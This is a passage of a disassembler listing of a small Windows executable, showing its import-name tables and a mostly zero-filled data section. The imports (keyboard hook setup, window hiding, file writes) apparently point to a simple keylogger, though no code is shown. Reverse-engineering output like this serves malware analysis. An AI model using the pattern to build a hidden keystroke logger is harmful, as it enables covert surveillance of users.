.rdata:004027D8                 dd rva word_402A2A
.rdata:004027DC                 dd rva word_402A08
.rdata:004027E0                 dd 0
.rdata:004027E4 ;
.rdata:004027E4 ; Import names for api-ms-win-crt-stdio-l1-1-0.dll
.rdata:004027E4 ;
.rdata:004027E4 off_4027E4      dd rva word_4029EC      ; DATA XREF: .rdata:00402698↑o
.rdata:004027E8                 dd rva word_402926
.rdata:004027EC                 dd rva word_40291E
.rdata:004027F0                 dd rva word_402914
.rdata:004027F4                 dd rva word_40290C
.rdata:004027F8                 dd rva word_402A7E
.rdata:004027FC                 dd 0
.rdata:00402800 word_402800     dw 16h                  ; DATA XREF: .rdata:off_402710↑o
.rdata:00402802                 db 'AllocConsole',0
.rdata:0040280F                 align 10h
.rdata:00402810 aKernel32Dll    db 'KERNEL32.dll',0     ; DATA XREF: .rdata:00402668↑o
.rdata:0040281D                 align 2
.rdata:0040281E word_40281E     dw 111h                 ; DATA XREF: .rdata:00402750↑o
.rdata:00402820                 db 'FindWindowA',0
.rdata:0040282C word_40282C     dw 384h                 ; DATA XREF: .rdata:00402754↑o
.rdata:0040282E                 db 'SetWindowsHookExW',0
.rdata:00402840 word_402840     dw 3B2h                 ; DATA XREF: .rdata:00402758↑o
.rdata:00402842                 db 'TranslateMessage',0
.rdata:00402853                 align 4
.rdata:00402854 word_402854     dw 0BDh                 ; DATA XREF: .rdata:0040274C↑o
.rdata:00402856                 db 'DispatchMessageW',0
.rdata:00402867                 align 4
.rdata:00402868 word_402868     dw 392h                 ; DATA XREF: .rdata:off_402748↑o
.rdata:0040286A                 db 'ShowWindow',0
.rdata:00402875                 align 2
.rdata:00402876 word_402876     dw 1Fh                  ; DATA XREF: .rdata:0040275C↑o
.rdata:00402878                 db 'CallNextHookEx',0
.rdata:00402887                 align 4
.rdata:00402888 word_402888     dw 189h                 ; DATA XREF: .rdata:00402760↑o
.rdata:0040288A                 db 'GetMessageW',0
.rdata:00402896 aUser32Dll      db 'USER32.dll',0       ; DATA XREF: .rdata:0040267C↑o
.rdata:004028A1                 align 2
.rdata:004028A2 word_4028A2     dw 1Ch                  ; DATA XREF: .rdata:00402774↑o
.rdata:004028A4                 db '__current_exception',0
.rdata:004028B8 word_4028B8     dw 1Dh                  ; DATA XREF: .rdata:00402770↑o
.rdata:004028BA                 db '__current_exception_context',0
.rdata:004028D6 word_4028D6     dw 48h                  ; DATA XREF: .rdata:0040276C↑o
.rdata:004028D8                 db 'memset',0
.rdata:004028DF                 align 10h
.rdata:004028E0 word_4028E0     dw 35h                  ; DATA XREF: .rdata:off_402768↑o
.rdata:004028E2                 db '_except_handler4_common',0
.rdata:004028FA aVcruntime140Dl db 'VCRUNTIME140.dll',0 ; DATA XREF: .rdata:00402690↑o
.rdata:0040290B                 align 4
.rdata:0040290C word_40290C     dw 7Dh                  ; DATA XREF: .rdata:004027F4↑o
.rdata:0040290E                 db 'fopen',0
.rdata:00402914 word_402914     dw 74h                  ; DATA XREF: .rdata:004027F0↑o
.rdata:00402916                 db 'fclose',0
.rdata:0040291D                 align 2
.rdata:0040291E word_40291E     dw 93h                  ; DATA XREF: .rdata:004027EC↑o
.rdata:00402920                 db 'puts',0
.rdata:00402925                 align 2
.rdata:00402926 word_402926     dw 80h                  ; DATA XREF: .rdata:004027E8↑o
.rdata:00402928                 db 'fputs',0
.rdata:0040292E word_40292E     dw 42h                  ; DATA XREF: .rdata:004027D0↑o
.rdata:00402930                 db '_seh_filter_exe',0
.rdata:00402940 word_402940     dw 44h                  ; DATA XREF: .rdata:004027CC↑o
.rdata:00402942                 db '_set_app_type',0
.rdata:00402950 word_402950     dw 2Eh                  ; DATA XREF: .rdata:off_40278C↑o
.rdata:00402952                 db '__setusermatherr',0
.rdata:00402963                 align 4
.rdata:00402964 word_402964     dw 19h                  ; DATA XREF: .rdata:004027B8↑o
.rdata:00402966                 db '_configure_narrow_argv',0
.rdata:0040297D                 align 2
.rdata:0040297E word_40297E     dw 35h                  ; DATA XREF: .rdata:004027A0↑o
.rdata:00402980                 db '_initialize_narrow_environment',0
.rdata:0040299F                 align 10h
.rdata:004029A0 word_4029A0     dw 2Ah                  ; DATA XREF: .rdata:off_402794↑o
.rdata:004029A2                 db '_get_initial_narrow_environment',0
.rdata:004029C2 word_4029C2     dw 38h                  ; DATA XREF: .rdata:004027BC↑o
.rdata:004029C4                 db '_initterm',0
.rdata:004029CE word_4029CE     dw 39h                  ; DATA XREF: .rdata:0040279C↑o
.rdata:004029D0                 db '_initterm_e',0
.rdata:004029DC word_4029DC     dw 58h                  ; DATA XREF: .rdata:004027D4↑o
.rdata:004029DE                 db 'exit',0
.rdata:004029E3                 align 4
.rdata:004029E4 word_4029E4     dw 25h                  ; DATA XREF: .rdata:004027C0↑o
.rdata:004029E6                 db '_exit',0
.rdata:004029EC word_4029EC     dw 54h                  ; DATA XREF: .rdata:off_4027E4↑o
.rdata:004029EE                 db '_set_fmode',0
.rdata:004029F9                 align 2
.rdata:004029FA word_4029FA     dw 5                    ; DATA XREF: .rdata:004027C4↑o
.rdata:004029FC                 db '__p___argc',0
.rdata:00402A07                 align 4
.rdata:00402A08 word_402A08     dw 6                    ; DATA XREF: .rdata:004027DC↑o
.rdata:00402A0A                 db '__p___argv',0
.rdata:00402A15                 align 2
.rdata:00402A16 word_402A16     dw 17h                  ; DATA XREF: .rdata:004027A4↑o
.rdata:00402A18                 db '_cexit',0
.rdata:00402A1F                 align 10h
.rdata:00402A20 word_402A20     dw 16h                  ; DATA XREF: .rdata:00402798↑o
.rdata:00402A22                 db '_c_exit',0
.rdata:00402A2A word_402A2A     dw 3Fh                  ; DATA XREF: .rdata:004027D8↑o
.rdata:00402A2C                 db '_register_thread_local_exe_atexit_callback',0
.rdata:00402A57                 align 4
.rdata:00402A58 word_402A58     dw 8                    ; DATA XREF: .rdata:off_402784↑o
.rdata:00402A5A                 db '_configthreadlocale',0
.rdata:00402A6E word_402A6E     dw 16h                  ; DATA XREF: .rdata:off_40277C↑o
.rdata:00402A70                 db '_set_new_mode',0
.rdata:00402A7E word_402A7E     dw 1                    ; DATA XREF: .rdata:004027F8↑o
.rdata:00402A80                 db '__p__commode',0
.rdata:00402A8D                 align 2
.rdata:00402A8E word_402A8E     dw 36h                  ; DATA XREF: .rdata:004027C8↑o
.rdata:00402A90                 db '_initialize_onexit_table',0
.rdata:00402AA9                 align 2
.rdata:00402AAA word_402AAA     dw 3Eh                  ; DATA XREF: .rdata:004027A8↑o
.rdata:00402AAC                 db '_register_onexit_function',0
.rdata:00402AC6 word_402AC6     dw 1Fh                  ; DATA XREF: .rdata:004027AC↑o
.rdata:00402AC8                 db '_crt_atexit',0
.rdata:00402AD4 word_402AD4     dw 1Dh                  ; DATA XREF: .rdata:004027B0↑o
.rdata:00402AD6                 db '_controlfp_s',0
.rdata:00402AE3                 align 4
.rdata:00402AE4 word_402AE4     dw 6Ah                  ; DATA XREF: .rdata:004027B4↑o
.rdata:00402AE6                 db 'terminate',0
.rdata:00402AF0 aApiMsWinCrtStd db 'api-ms-win-crt-stdio-l1-1-0.dll',0
.rdata:00402AF0                                         ; DATA XREF: .rdata:004026A4↑o
.rdata:00402B10 aApiMsWinCrtRun db 'api-ms-win-crt-runtime-l1-1-0.dll',0
.rdata:00402B10                                         ; DATA XREF: .rdata:004026B8↑o
.rdata:00402B32 aApiMsWinCrtMat db 'api-ms-win-crt-math-l1-1-0.dll',0
.rdata:00402B32                                         ; DATA XREF: .rdata:004026CC↑o
.rdata:00402B51                 align 2
.rdata:00402B52 aApiMsWinCrtLoc db 'api-ms-win-crt-locale-l1-1-0.dll',0
.rdata:00402B52                                         ; DATA XREF: .rdata:004026E0↑o
.rdata:00402B73                 align 4
.rdata:00402B74 aApiMsWinCrtHea db 'api-ms-win-crt-heap-l1-1-0.dll',0
.rdata:00402B74                                         ; DATA XREF: .rdata:004026F4↑o
.rdata:00402B93                 align 4
.rdata:00402B94 word_402B94     dw 5D5h                 ; DATA XREF: .rdata:0040273C↑o
.rdata:00402B96                 db 'UnhandledExceptionFilter',0
.rdata:00402BAF                 align 10h
.rdata:00402BB0 word_402BB0     dw 594h                 ; DATA XREF: .rdata:00402738↑o
.rdata:00402BB2                 db 'SetUnhandledExceptionFilter',0
.rdata:00402BCE word_402BCE     dw 22Ch                 ; DATA XREF: .rdata:00402734↑o
.rdata:00402BD0                 db 'GetCurrentProcess',0
.rdata:00402BE2 word_402BE2     dw 5B4h                 ; DATA XREF: .rdata:00402730↑o
.rdata:00402BE4                 db 'TerminateProcess',0
.rdata:00402BF5                 align 2
.rdata:00402BF6 word_402BF6     dw 3A5h                 ; DATA XREF: .rdata:0040272C↑o
.rdata:00402BF8                 db 'IsProcessorFeaturePresent',0
.rdata:00402C12 word_402C12     dw 46Dh                 ; DATA XREF: .rdata:00402728↑o
.rdata:00402C14                 db 'QueryPerformanceCounter',0
.rdata:00402C2C word_402C2C     dw 22Dh                 ; DATA XREF: .rdata:00402724↑o
.rdata:00402C2E                 db 'GetCurrentProcessId',0
.rdata:00402C42 word_402C42     dw 231h                 ; DATA XREF: .rdata:00402720↑o
.rdata:00402C44                 db 'GetCurrentThreadId',0
.rdata:00402C57                 align 4
.rdata:00402C58 word_402C58     dw 303h                 ; DATA XREF: .rdata:0040271C↑o
.rdata:00402C5A                 db 'GetSystemTimeAsFileTime',0
.rdata:00402C72 word_402C72     dw 381h                 ; DATA XREF: .rdata:00402718↑o
.rdata:00402C74                 db 'InitializeSListHead',0
.rdata:00402C88 word_402C88     dw 39Dh                 ; DATA XREF: .rdata:00402714↑o
.rdata:00402C8A                 db 'IsDebuggerPresent',0
.rdata:00402C9C word_402C9C     dw 28Fh                 ; DATA XREF: .rdata:00402740↑o
.rdata:00402C9E                 db 'GetModuleHandleW',0
.rdata:00402CAF                 align 400h
.rdata:00402CAF _rdata          ends
.rdata:00402CAF
.data:00403000 ; Section 3. (virtual address 00003000)
.data:00403000 ; Virtual size                  : 000003DC (    988.)
.data:00403000 ; Section size in file          : 00000200 (    512.)
.data:00403000 ; Offset to raw data for section: 00002200
.data:00403000 ; Flags C0000040: Data Readable Writable
.data:00403000 ; Alignment     : default
.data:00403000 ; ===========================================================================
.data:00403000
.data:00403000 ; Segment type: Pure data
.data:00403000 ; Segment permissions: Read/Write
.data:00403000 _data           segment para public 'DATA' use32
.data:00403000                 assume cs:_data
.data:00403000                 ;org 403000h
.data:00403000 ; uintptr_t __security_cookie
.data:00403000 ___security_cookie dd 0BB40E64Eh        ; DATA XREF: __security_check_cookie(x)↑r
.data:00403000                                         ; ___report_gsfailure+D4↑r ...
.data:00403004                 align 40h
.data:00403040 dword_403040    dd 44BF19B1h            ; DATA XREF: ___report_gsfailure+E4↑r
.data:00403040                                         ; ___security_init_cookie+43↑w
.data:00403044                 db 0FFh
.data:00403045                 db 0FFh
.data:00403046                 db 0FFh
.data:00403047                 db 0FFh
.data:00403048 dword_403048    dd 1                    ; DATA XREF: sub_4017CE+2↑r
.data:0040304C                 align 10h
.data:00403050 dword_403050    dd 0FFFFFFFFh           ; DATA XREF: sub_401A84+168↑r
.data:00403050                                         ; sub_401A84+189↑w ...
.data:00403054 dword_403054    dd 0FFFFFFFFh           ; DATA XREF: sub_401A84+171↑r
.data:00403054                                         ; sub_401A84+18F↑w ...
.data:00403058 dword_403058    dd 1                    ; DATA XREF: sub_401A84+D↑w
.data:00403058                                         ; sub_401A84:loc_401BE7↑r ...
.data:0040305C dword_40305C    dd 1                    ; DATA XREF: ___scrt_is_ucrt_dll_in_use+2↑r
.data:00403060 dword_403060    dd 0                    ; DATA XREF: ___report_gsfailure+A0↑w
.data:00403060                                         ; .rdata:ExceptionInfo↑o
.data:00403064 dword_403064    dd 0                    ; DATA XREF: ___report_gsfailure+AA↑w
.data:00403068                 db    0
.data:00403069                 db    0
.data:0040306A                 db    0
.data:0040306B                 db    0
.data:0040306C dword_40306C    dd 0                    ; DATA XREF: ___report_gsfailure+9B↑w
.data:00403070 dword_403070    dd 0                    ; DATA XREF: ___report_gsfailure+B4↑w
.data:00403074 dword_403074    dd 0                    ; DATA XREF: ___report_gsfailure+C4↑w
.data:00403078                 db    0
.data:00403079                 db    0
.data:0040307A                 db    0
.data:0040307B                 db    0
.data:0040307C                 db    0
.data:0040307D                 db    0
.data:0040307E                 db    0
.data:0040307F                 db    0
.data:00403080                 db    0
.data:00403081                 db    0
.data:00403082                 db    0
.data:00403083                 db    0
.data:00403084                 db    0
.data:00403085                 db    0
.data:00403086                 db    0
.data:00403087                 db    0
.data:00403088                 db    0
.data:00403089                 db    0
.data:0040308A                 db    0
.data:0040308B                 db    0
.data:0040308C                 db    0
.data:0040308D                 db    0
.data:0040308E                 db    0
.data:0040308F                 db    0
.data:00403090                 db    0
.data:00403091                 db    0
.data:00403092                 db    0
.data:00403093                 db    0
.data:00403094                 db    0
.data:00403095                 db    0
.data:00403096                 db    0
.data:00403097                 db    0
.data:00403098                 db    0
.data:00403099                 db    0
.data:0040309A                 db    0
.data:0040309B                 db    0
.data:0040309C                 db    0
.data:0040309D                 db    0
.data:0040309E                 db    0
.data:0040309F                 db    0
.data:004030A0                 db    0
.data:004030A1                 db    0
.data:004030A2                 db    0
.data:004030A3                 db    0
.data:004030A4                 db    0
.data:004030A5                 db    0
.data:004030A6                 db    0
.data:004030A7                 db    0
.data:004030A8                 db    0
.data:004030A9                 db    0
.data:004030AA                 db    0
.data:004030AB                 db    0
.data:004030AC                 db    0
.data:004030AD                 db    0
.data:004030AE                 db    0
.data:004030AF                 db    0
.data:004030B0 dword_4030B0    dd 0                    ; DATA XREF: ___report_gsfailure+8C↑w
.data:004030B0                                         ; .rdata:ExceptionInfo↑o
.data:004030B4                 db    0
.data:004030B5                 db    0
.data:004030B6                 db    0
.data:004030B7                 db    0
.data:004030B8                 db    0
.data:004030B9                 db    0
.data:004030BA                 db    0
.data:004030BB                 db    0
.data:004030BC                 db    0
.data:004030BD                 db    0
.data:004030BE                 db    0
.data:004030BF                 db    0
.data:004030C0                 db    0
.data:004030C1                 db    0
.data:004030C2                 db    0
.data:004030C3                 db    0
.data:004030C4                 db    0
.data:004030C5                 db    0
.data:004030C6                 db    0
.data:004030C7                 db    0
.data:004030C8                 db    0
.data:004030C9                 db    0
.data:004030CA                 db    0
.data:004030CB                 db    0
.data:004030CC                 db    0
.data:004030CD                 db    0
.data:004030CE                 db    0
.data:004030CF                 db    0
.data:004030D0                 db    0
.data:004030D1                 db    0
.data:004030D2                 db    0
.data:004030D3                 db    0
.data:004030D4                 db    0
.data:004030D5                 db    0
.data:004030D6                 db    0
.data:004030D7                 db    0
.data:004030D8                 db    0
.data:004030D9                 db    0
.data:004030DA                 db    0
.data:004030DB                 db    0
.data:004030DC                 db    0
.data:004030DD                 db    0
.data:004030DE                 db    0
.data:004030DF                 db    0
.data:004030E0                 db    0
.data:004030E1                 db    0
.data:004030E2                 db    0
.data:004030E3                 db    0
.data:004030E4                 db    0
.data:004030E5                 db    0
.data:004030E6                 db    0
.data:004030E7                 db    0
.data:004030E8                 db    0
.data:004030E9                 db    0
.data:004030EA                 db    0
.data:004030EB                 db    0
.data:004030EC                 db    0
.data:004030ED                 db    0
.data:004030EE                 db    0
.data:004030EF                 db    0
.data:004030F0                 db    0
.data:004030F1                 db    0
.data:004030F2                 db    0
.data:004030F3                 db    0
.data:004030F4                 db    0
.data:004030F5                 db    0
.data:004030F6                 db    0
.data:004030F7                 db    0
.data:004030F8                 db    0
.data:004030F9                 db    0
.data:004030FA                 db    0
.data:004030FB                 db    0
.data:004030FC                 db    0
.data:004030FD                 db    0
.data:004030FE                 db    0
.data:004030FF                 db    0
.data:00403100                 db    0
.data:00403101                 db    0
.data:00403102                 db    0
.data:00403103                 db    0
.data:00403104                 db    0
.data:00403105                 db    0
.data:00403106                 db    0
.data:00403107                 db    0
.data:00403108                 db    0
.data:00403109                 db    0
.data:0040310A                 db    0
.data:0040310B                 db    0
.data:0040310C                 db    0
.data:0040310D                 db    0
.data:0040310E                 db    0
.data:0040310F                 db    0
.data:00403110                 db    0
.data:00403111                 db    0
.data:00403112                 db    0
.data:00403113                 db    0
.data:00403114                 db    0
.data:00403115                 db    0
.data:00403116                 db    0
.data:00403117                 db    0
.data:00403118                 db    0
.data:00403119                 db    0
.data:0040311A                 db    0
.data:0040311B                 db    0
.data:0040311C                 db    0
.data:0040311D                 db    0
.data:0040311E                 db    0
.data:0040311F                 db    0
.data:00403120                 db    0
.data:00403121                 db    0
.data:00403122                 db    0
.data:00403123                 db    0
.data:00403124                 db    0
.data:00403125                 db    0
.data:00403126                 db    0
.data:00403127                 db    0
.data:00403128                 db    0
.data:00403129                 db    0
.data:0040312A                 db    0
.data:0040312B                 db    0
.data:0040312C                 db    0
.data:0040312D                 db    0
.data:0040312E                 db    0
.data:0040312F                 db    0
.data:00403130                 db    0
.data:00403131                 db    0
.data:00403132                 db    0
.data:00403133                 db    0
.data:00403134                 db    0
.data:00403135                 db    0
.data:00403136                 db    0
.data:00403137                 db    0
.data:00403138                 db    0
.data:00403139                 db    0
.data:0040313A                 db    0
.data:0040313B                 db    0
.data:0040313C word_40313C     dw 0                    ; DATA XREF: ___report_gsfailure+60↑w
.data:0040313E                 align 10h
.data:00403140 word_403140     dw 0                    ; DATA XREF: ___report_gsfailure+59↑w
.data:00403142                 align 4
.data:00403144 word_403144     dw 0                    ; DATA XREF: ___report_gsfailure+52↑w
.data:00403146                 align 4
.data:00403148 word_403148     dw 0                    ; DATA XREF: ___report_gsfailure+4B↑w
.data:0040314A                 align 4
.data:0040314C dword_40314C    dd 0                    ; DATA XREF: ___report_gsfailure+37↑w
.data:00403150 dword_403150    dd 0                    ; DATA XREF: ___report_gsfailure+31↑w
.data:00403154 dword_403154    dd 0                    ; DATA XREF: ___report_gsfailure+2B↑w
.data:00403158 dword_403158    dd 0                    ; DATA XREF: ___report_gsfailure+25↑w
.data:0040315C dword_40315C    dd 0                    ; DATA XREF: ___report_gsfailure+1F↑w
.data:00403160 dword_403160    dd 0                    ; DATA XREF: ___report_gsfailure:loc_40139B↑w
.data:00403164 dword_403164    dd 0                    ; DATA XREF: ___report_gsfailure+71↑w
.data:00403168 dword_403168    dd 0                    ; DATA XREF: ___report_gsfailure+79↑w
.data:00403168                                         ; ___report_gsfailure+96↑r
.data:0040316C word_40316C     dw 0                    ; DATA XREF: ___report_gsfailure+44↑w
.data:0040316E                 align 10h
.data:00403170 dword_403170    dd 0                    ; DATA XREF: ___report_gsfailure+68↑w
.data:00403174 dword_403174    dd 0                    ; DATA XREF: ___report_gsfailure+81↑w
.data:00403178 word_403178     dw 0                    ; DATA XREF: ___report_gsfailure+3D↑w
.data:0040317A                 db    0
.data:0040317B                 db    0
.data:0040317C                 db    0
.data:0040317D                 db    0
.data:0040317E                 db    0
.data:0040317F                 db    0
.data:00403180                 db    0
.data:00403181                 db    0
.data:00403182                 db    0
.data:00403183                 db    0
.data:00403184                 db    0
.data:00403185                 db    0
.data:00403186                 db    0
.data:00403187                 db    0
.data:00403188                 db    0
.data:00403189                 db    0
.data:0040318A                 db    0
.data:0040318B                 db    0
.data:0040318C                 db    0
.data:0040318D                 db    0
.data:0040318E                 db    0
.data:0040318F                 db    0
.data:00403190                 db    0
.data:00403191                 db    0
.data:00403192                 db    0
.data:00403193                 db    0
.data:00403194                 db    0
.data:00403195                 db    0
.data:00403196                 db    0
.data:00403197                 db    0
.data:00403198                 db    0
.data:00403199                 db    0
.data:0040319A                 db    0
.data:0040319B                 db    0
.data:0040319C                 db    0
.data:0040319D                 db    0
.data:0040319E                 db    0
.data:0040319F                 db    0
.data:004031A0                 db    0
.data:004031A1                 db    0
.data:004031A2                 db    0
.data:004031A3                 db    0
.data:004031A4                 db    0
.data:004031A5                 db    0
.data:004031A6                 db    0
.data:004031A7                 db    0
.data:004031A8                 db    0
.data:004031A9                 db    0
.data:004031AA                 db    0
.data:004031AB                 db    0
.data:004031AC                 db    0
.data:004031AD                 db    0
.data:004031AE                 db    0
.data:004031AF                 db    0
.data:004031B0                 db    0
.data:004031B1                 db    0
.data:004031B2                 db    0
.data:004031B3                 db    0
.data:004031B4                 db    0
.data:004031B5                 db    0
.data:004031B6                 db    0
.data:004031B7                 db    0
.data:004031B8                 db    0
.data:004031B9                 db    0
.data:004031BA                 db    0
.data:004031BB                 db    0
.data:004031BC                 db    0
.data:004031BD                 db    0
.data:004031BE                 db    0
.data:004031BF                 db    0
.data:004031C0                 db    0
.data:004031C1                 db    0
.data:004031C2                 db    0
.data:004031C3                 db    0
.data:004031C4                 db    0
.data:004031C5                 db    0
.data:004031C6                 db    0
.data:004031C7                 db    0
.data:004031C8                 db    0
.data:004031C9                 db    0
.data:004031CA                 db    0
.data:004031CB                 db    0
.data:004031CC                 db    0
.data:004031CD                 db    0
.data:004031CE                 db    0
.data:004031CF                 db    0
.data:004031D0                 db    0
.data:004031D1                 db    0
.data:004031D2                 db    0
.data:004031D3                 db    0
.data:004031D4                 db    0
.data:004031D5                 db    0
.data:004031D6                 db    0
.data:004031D7                 db    0
.data:004031D8                 db    0
.data:004031D9                 db    0
.data:004031DA                 db    0
.data:004031DB                 db    0
.data:004031DC                 db    0
.data:004031DD                 db    0
.data:004031DE                 db    0
.data:004031DF                 db    0
.data:004031E0                 db    0
.data:004031E1                 db    0
.data:004031E2                 db    0
.data:004031E3                 db    0
.data:004031E4                 db    0
.data:004031E5                 db    0
.data:004031E6                 db    0
.data:004031E7                 db    0
.data:004031E8                 db    0
.data:004031E9                 db    0
.data:004031EA                 db    0
.data:004031EB                 db    0
.data:004031EC                 db    0
.data:004031ED                 db    0
.data:004031EE                 db    0
.data:004031EF                 db    0
.data:004031F0                 db    0
.data:004031F1                 db    0
.data:004031F2                 db    0
.data:004031F3                 db    0
.data:004031F4                 db    0
.data:004031F5                 db    0
.data:004031F6                 db    0
.data:004031F7                 db    0
.data:004031F8                 db    0
.data:004031F9                 db    0
.data:004031FA                 db    0
.data:004031FB                 db    0
.data:004031FC                 db    0
.data:004031FD                 db    0
.data:004031FE                 db    0
.data:004031FF                 db    0
.data:00403200                 db    ? ;
.data:00403201                 db    ? ;
.data:00403202                 db    ? ;
.data:00403203                 db    ? ;
.data:00403204                 db    ? ;
.data:00403205                 db    ? ;
.data:00403206                 db    ? ;
.data:00403207                 db    ? ;
.data:00403208                 db    ? ;
.data:00403209                 db    ? ;
.data:0040320A                 db    ? ;
.data:0040320B                 db    ? ;
.data:0040320C                 db    ? ;
.data:0040320D                 db    ? ;
.data:0040320E                 db    ? ;
.data:0040320F                 db    ? ;
.data:00403210                 db    ? ;
.data:00403211                 db    ? ;
.data:00403212                 db    ? ;
.data:00403213                 db    ? ;
.data:00403214                 db    ? ;
.data:00403215                 db    ? ;
.data:00403216                 db    ? ;
.data:00403217                 db    ? ;
.data:00403218                 db    ? ;
.data:00403219                 db    ? ;
.data:0040321A                 db    ? ;
.data:0040321B                 db    ? ;
.data:0040321C                 db    ? ;
.data:0040321D                 db    ? ;
.data:0040321E                 db    ? ;
.data:0040321F                 db    ? ;
.data:00403220                 db    ? ;
.data:00403221                 db    ? ;
.data:00403222                 db    ? ;
.data:00403223                 db    ? ;
.data:00403224                 db    ? ;
.data:00403225                 db    ? ;
.data:00403226                 db    ? ;
.data:00403227                 db    ? ;
.data:00403228                 db    ? ;
.data:00403229                 db    ? ;
.data:0040322A                 db    ? ;
.data:0040322B                 db    ? ;
.data:0040322C                 db    ? ;
.data:0040322D                 db    ? ;
.data:0040322E                 db    ? ;
.data:0040322F                 db    ? ;
.data:00403230                 db    ? ;
.data:00403231                 db    ? ;
.data:00403232                 db    ? ;
.data:00403233                 db    ? ;
.data:00403234                 db    ? ;
.data:00403235                 db    ? ;
.data:00403236                 db    ? ;
.data:00403237                 db    ? ;
.data:00403238                 db    ? ;
.data:00403239                 db    ? ;
.data:0040323A                 db    ? ;
.data:0040323B                 db    ? ;
.data:0040323C                 db    ? ;
.data:0040323D                 db    ? ;
.data:0040323E                 db    ? ;
.data:0040323F                 db    ? ;
.data:00403240                 db    ? ;
.data:00403241                 db    ? ;
.data:00403242                 db    ? ;
.data:00403243                 db    ? ;
.data:00403244                 db    ? ;
.data:00403245                 db    ? ;
.data:00403246                 db    ? ;
.data:00403247                 db    ? ;
.data:00403248                 db    ? ;
.data:00403249                 db    ? ;
.data:0040324A                 db    ? ;
.data:0040324B                 db    ? ;
.data:0040324C                 db    ? ;
.data:0040324D                 db    ? ;
.data:0040324E                 db    ? ;
.data:0040324F                 db    ? ;
.data:00403250                 db    ? ;
.data:00403251                 db    ? ;
.data:00403252                 db    ? ;
.data:00403253                 db    ? ;
.data:00403254                 db    ? ;
.data:00403255                 db    ? ;
.data:00403256                 db    ? ;
.data:00403257                 db    ? ;
.data:00403258                 db    ? ;
.data:00403259                 db    ? ;
.data:0040325A                 db    ? ;
.data:0040325B                 db    ? ;
.data:0040325C                 db    ? ;
.data:0040325D                 db    ? ;
.data:0040325E                 db    ? ;
.data:0040325F                 db    ? ;
.data:00403260                 db    ? ;
.data:00403261                 db    ? ;
.data:00403262                 db    ? ;
.data:00403263                 db    ? ;
.data:00403264                 db    ? ;
.data:00403265                 db    ? ;
.data:00403266                 db    ? ;
.data:00403267                 db    ? ;
.data:00403268                 db    ? ;
.data:00403269                 db    ? ;
.data:0040326A                 db    ? ;
.data:0040326B                 db    ? ;
.data:0040326C                 db    ? ;
.data:0040326D                 db    ? ;
.data:0040326E                 db    ? ;
.data:0040326F                 db    ? ;
.data:00403270                 db    ? ;
.data:00403271                 db    ? ;
.data:00403272                 db    ? ;
.data:00403273                 db    ? ;
.data:00403274                 db    ? ;
.data:00403275                 db    ? ;
.data:00403276                 db    ? ;
.data:00403277                 db    ? ;
.data:00403278                 db    ? ;
.data:00403279                 db    ? ;
.data:0040327A                 db    ? ;
.data:0040327B                 db    ? ;
.data:0040327C                 db    ? ;
.data:0040327D                 db    ? ;
.data:0040327E                 db    ? ;
.data:0040327F                 db    ? ;
.data:00403280                 db    ? ;
.data:00403281                 db    ? ;
.data:00403282                 db    ? ;
.data:00403283                 db    ? ;
.data:00403284                 db    ? ;
.data:00403285                 db    ? ;
.data:00403286                 db    ? ;
.data:00403287                 db    ? ;
.data:00403288                 db    ? ;
.data:00403289                 db    ? ;
.data:0040328A                 db    ? ;
.data:0040328B                 db    ? ;
.data:0040328C                 db    ? ;
.data:0040328D                 db    ? ;
.data:0040328E                 db    ? ;
.data:0040328F                 db    ? ;
.data:00403290                 db    ? ;
.data:00403291                 db    ? ;
.data:00403292                 db    ? ;
.data:00403293                 db    ? ;
.data:00403294                 db    ? ;
.data:00403295                 db    ? ;
.data:00403296                 db    ? ;
.data:00403297                 db    ? ;
.data:00403298                 db    ? ;
.data:00403299                 db    ? ;
.data:0040329A                 db    ? ;
.data:0040329B                 db    ? ;
.data:0040329C                 db    ? ;
.data:0040329D                 db    ? ;
.data:0040329E                 db    ? ;
.data:0040329F                 db    ? ;
.data:004032A0                 db    ? ;
.data:004032A1                 db    ? ;
.data:004032A2                 db    ? ;
.data:004032A3                 db    ? ;
.data:004032A4                 db    ? ;
.data:004032A5                 db    ? ;
.data:004032A6                 db    ? ;
.data:004032A7                 db    ? ;
.data:004032A8                 db    ? ;
.data:004032A9                 db    ? ;
.data:004032AA                 db    ? ;
.data:004032AB                 db    ? ;
.data:004032AC                 db    ? ;
.data:004032AD                 db    ? ;
.data:004032AE                 db    ? ;
.data:004032AF                 db    ? ;
.data:004032B0                 db    ? ;
.data:004032B1                 db    ? ;
.data:004032B2                 db    ? ;
.data:004032B3                 db    ? ;
.data:004032B4                 db    ? ;
.data:004032B5                 db    ? ;
.data:004032B6                 db    ? ;
.data:004032B7                 db    ? ;
.data:004032B8                 db    ? ;
.data:004032B9                 db    ? ;
.data:004032BA                 db    ? ;
.data:004032BB                 db    ? ;
.data:004032BC                 db    ? ;
.data:004032BD                 db    ? ;
.data:004032BE                 db    ? ;
.data:004032BF                 db    ? ;
.data:004032C0                 db    ? ;
.data:004032C1                 db    ? ;
.data:004032C2                 db    ? ;
.data:004032C3                 db    ? ;
.data:004032C4                 db    ? ;
.data:004032C5                 db    ? ;
.data:004032C6                 db    ? ;
.data:004032C7                 db    ? ;
.data:004032C8                 db    ? ;
.data:004032C9                 db    ? ;
.data:004032CA                 db    ? ;
.data:004032CB                 db    ? ;
.data:004032CC                 db    ? ;
.data:004032CD                 db    ? ;
.data:004032CE                 db    ? ;
.data:004032CF                 db    ? ;
.data:004032D0                 db    ? ;
.data:004032D1                 db    ? ;
.data:004032D2                 db    ? ;
.data:004032D3                 db    ? ;
.data:004032D4                 db    ? ;
.data:004032D5                 db    ? ;
.data:004032D6                 db    ? ;
.data:004032D7                 db    ? ;
.data:004032D8                 db    ? ;
.data:004032D9                 db    ? ;
.data:004032DA                 db    ? ;
.data:004032DB                 db    ? ;
.data:004032DC                 db    ? ;
.data:004032DD                 db    ? ;
.data:004032DE                 db    ? ;
.data:004032DF                 db    ? ;
.data:004032E0                 db    ? ;
.data:004032E1                 db    ? ;
.data:004032E2                 db    ? ;
.data:004032E3                 db    ? ;
.data:004032E4                 db    ? ;
.data:004032E5                 db    ? ;
.data:004032E6                 db    ? ;
.data:004032E7                 db    ? ;
.data:004032E8                 db    ? ;
.data:004032E9                 db    ? ;
.data:004032EA                 db    ? ;
.data:004032EB                 db    ? ;
.data:004032EC                 db    ? ;
.data:004032ED                 db    ? ;
.data:004032EE                 db    ? ;
.data:004032EF                 db    ? ;
.data:004032F0                 db    ? ;
.data:004032F1                 db    ? ;
.data:004032F2                 db    ? ;
.data:004032F3                 db    ? ;
.data:004032F4                 db    ? ;
.data:004032F5                 db    ? ;
.data:004032F6                 db    ? ;
